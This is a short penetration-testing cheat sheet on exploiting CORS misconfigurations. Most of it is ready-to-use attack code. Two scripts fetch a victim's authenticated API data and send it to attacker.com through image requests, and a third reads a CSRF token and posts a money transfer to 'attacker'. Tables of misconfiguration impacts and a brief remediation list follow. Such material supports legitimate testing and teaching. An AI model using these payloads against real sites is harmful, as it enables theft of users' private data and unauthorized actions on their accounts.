# CORS Impact — Exploitation and Real-World Attacks

## Summary
How CORS misconfigurations enable real data theft, API abuse, and session hijacking.

## Data Exfiltration via CORS

```html
<!-- Full POC: steal user profile data -->
<script>
fetch("https://target.com/api/userinfo", { credentials: "include" })
  .then(r => r.json())
  .then(j => {
    var img = new Image();
    img.src = "https://attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(j));
  });
</script>
```

## Exfiltration via Script Injection

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://target.com/api/private", true);
xhr.withCredentials = true;
xhr.onload = function() {
  new Image().src = "https://attacker.com/?d=" + btoa(xhr.responseText);
};
xhr.send();
</script>
```

## API Abuse via Malicious Site

```javascript
// Automate API calls from attacker.com on victim's behalf
async function abuseAPI() {
  const session = await fetch("https://target.com/api/session", { credentials: "include" });
  const csrf = session.headers.get("X-CSRF-Token");

  await fetch("https://target.com/api/transfer", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
    body: JSON.stringify({ to: "attacker", amount: 1000 })
  });
}
abuseAPI();
```

## CSRF-Style Attack with CORS

Traditional CSRF requires form submission — CORS-based attacks can use `fetch` with full control:

| Feature | Traditional CSRF | CORS-Based Attack |
|---------|-----------------|-------------------|
| Read response | No | Yes (via ACA-Origin) |
| Custom headers | No | Yes |
| JSON body | No (form-encoded) | Yes |
| Access cookies | Auto-sent | Yes (credentials: include) |

## Chaining CORS with Other Vulnerabilities

```bash
# If CORS allows reading API responses + the API exposes PII:
# Chain with:
# - Session hijacking via XSS to exfil tokens
# - IDOR to access other users data via CORS requests
# - CSRF token leak via CORS-exposed headers
```

## Real-World Impact Scenarios

| Configuration | Impact |
|--------------|--------|
| ACA-Origin: * + Credentials: true | Any website can perform authenticated requests |
| ACA-Origin reflected + Credentials: true | Any website can read authenticated responses |
| ACA-Origin: null + Credentials: true | Sandboxed iframe can access API |
| ACA-Expose-Headers: X-Session | Session token leak to JavaScript |

## Remediation Advice

- Maintain a strict allow list of origins
- Never reflect Origin header directly
- Use Vary: Origin header for caching
- Disable CORS entirely for authenticated endpoints if not needed
- Use CSRF tokens even with CORS restrictions

